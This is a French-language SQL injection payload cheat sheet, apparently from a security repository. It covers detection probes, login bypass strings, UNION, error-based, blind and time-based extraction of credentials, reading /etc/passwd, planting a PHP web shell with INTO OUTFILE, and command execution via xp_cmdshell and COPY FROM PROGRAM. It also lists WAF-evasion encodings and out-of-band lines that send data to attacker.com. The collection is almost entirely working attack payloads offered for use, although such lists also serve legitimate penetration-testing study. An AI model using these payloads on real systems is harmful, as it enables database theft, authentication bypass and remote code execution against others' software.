# 💉 Charges utiles d’injection SQL

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> **Précisions de lecture :** Les expressions, commentaires, fonctions et interactions hors bande dépendent du SGBD, de sa version, du contexte de la requête et des privilèges. Certains exemples sont des fragments à insérer, pas des requêtes autonomes. Les commandes de lecture, écriture et exécution nécessitent des prérequis particuliers ; la source est conservée sans exécution.

---

## 📋 Table des matières

- [Charges utiles de détection](#-charges-utiles-de-détection)
- [Contournement de l’authentification](#-contournement-de-lauthentification)
- [Injection fondée sur UNION](#-injection-fondée-sur-union)
- [Injection fondée sur les erreurs](#-injection-fondée-sur-les-erreurs)
- [Injection SQL à l’aveugle](#-injection-sql-à-laveugle)
- [Injection par temporisation](#-injection-par-temporisation)
- [Cas propres aux SGBD](#-cas-propres-aux-sgbd)
- [Contournement des WAF](#-contournement-des-waf)
- [Interactions hors bande](#-interactions-hors-bande)

---

## 🔍 Charges utiles de détection

### Détection de base

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Détection booléenne

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Détection arithmétique

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Concaténation de chaînes

```sql
' || 'test
' + 'test
' 'test
```

---

## 🔓 Contournement de l’authentification

### Contournement de la connexion

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Champ du nom d’utilisateur

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Champ du mot de passe

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Combinaisons courantes de contournement

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 🔗 Injection fondée sur UNION

### Détermination du nombre de colonnes

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION de base

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Extraction de données

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION avec commentaires

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-injection-fondée-sur-les-erreurs"></a>
## ⚠️ Injection fondée sur les erreurs

### Erreurs MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Erreurs MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Erreurs PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Erreurs Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 🔮 Injection SQL à l’aveugle

### Injection aveugle booléenne

```sql
-- Condition vraie
' AND 1=1--
' AND 'a'='a'--

-- Condition fausse
' AND 1=2--
' AND 'a'='b'--

-- Extraction d’un caractère
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Recherche dichotomique

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

### Détermination de la longueur

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Énumération des tables et colonnes

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-injection-par-temporisation"></a>
## ⏱️ Injection par temporisation

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-cas-propres-aux-sgbd"></a>
## 🗄️ Cas propres aux SGBD

### Charges utiles MySQL

```sql
-- Version
' UNION SELECT @@version--
' UNION SELECT version()--

-- Utilisateur courant
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Base de données
' UNION SELECT database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Colonnes
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Lire un fichier
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Écrire un fichier
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### Charges utiles PostgreSQL

```sql
-- Version
' UNION SELECT version()--

-- Utilisateur courant
' UNION SELECT current_user--

-- Base de données
' UNION SELECT current_database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Lire un fichier
' UNION SELECT pg_read_file('/etc/passwd')--

-- Exécution de commandes
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### Charges utiles MSSQL

```sql
-- Version
' UNION SELECT @@version--

-- Utilisateur courant
' UNION SELECT SYSTEM_USER--

-- Base de données
' UNION SELECT DB_NAME()--

-- Tables
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Exécution de commandes
'; EXEC xp_cmdshell 'whoami';--

-- Activer xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Charges utiles Oracle

```sql
-- Version
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Utilisateur courant
' UNION SELECT user FROM dual--

-- Base de données
' UNION SELECT ora_database_name FROM dual--

-- Tables
' UNION SELECT table_name FROM all_tables--

-- Colonnes
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-contournement-des-waf"></a>
## 🛡️ Contournement des WAF

### Contournement des espaces

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Contournement par commentaires

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Variations de casse

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Encodage

```sql
-- Encodage d’URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Double encodage d’URL
%2527%20OR%201=1--

-- Encodage hexadécimal
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Contournement des mots-clés

```sql
-- Contournement de UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Contournement de SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Contournement de AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (pollution des paramètres HTTP)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📡 Interactions hors bande

### Interactions hors bande MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### Interactions hors bande MSSQL

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### Interactions hors bande PostgreSQL

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Interactions hors bande Oracle

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📊 Référence rapide

### Ordre de détection

1. `'` — Apostrophe
2. `"` — Guillemet double
3. `' OR '1'='1` — Injection booléenne
4. `' AND SLEEP(5)--` — Temporisation
5. `' UNION SELECT NULL--` — Fondé sur UNION

### Points de terminaison courants

```
- Login forms
- Search boxes
- User IDs in URLs
- Cookie values
- HTTP headers (User-Agent, Referer)
- API parameters
```

### Commentaires SQL par SGBD

|SGBD|Commentaires|
|------|----------|
|MySQL|`-- `, `#`, `/* */`|
|PostgreSQL|`-- `, `/* */`|
|MSSQL|`-- `, `/* */`|
|Oracle|`-- `, `/* */`|

---

## 📚 Ressources

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Collection de charges utiles d’injection SQL</b><br>
  <i>À des fins pédagogiques uniquement !</i>
</p>
